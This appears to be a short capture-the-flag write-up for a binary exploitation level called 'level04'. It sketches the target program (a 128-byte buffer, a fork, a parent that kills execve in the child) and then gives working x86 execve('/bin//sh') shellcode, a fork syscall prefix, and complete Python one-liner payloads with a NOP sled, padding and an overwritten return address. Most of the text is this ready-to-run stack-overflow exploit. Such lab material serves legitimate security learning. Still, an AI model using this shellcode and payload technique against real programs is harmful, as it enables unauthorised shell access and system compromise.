/*******************************/
/*	  R E V E R S E	       */
/*******************************/


main()
-> buffer[128]
-> fork()
-> set 32 first bytes to '\0'
-> child:
	buffer overflow ->
	A*156

-> SIGHUP is sent while parent end 
-> intercept syscall of the children and kill an execve immediatly




Simple shell code:
(python -c 'print "\x90"*(50) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc"*(156-78) + "\xc0\xd6\xff\xff"';cat) | ./level04

->needed because parent process kill his child
-> impossible to change PID
-> so create a new process
fork: \xB8\x02\x00\x00\x00\xCD\x80

shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80


-> Complete payload:
(python -c 'print "\x90"*(100) + "\xB8\x02\x00\x00\x00\xCD\x80\x31\xC0\xB0\xAC\xBB\x01\x00\x00\x00\x31\xC9\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xcc"*(156-148) + "\x90\xd6\xff\xff"';cat) | ./level04
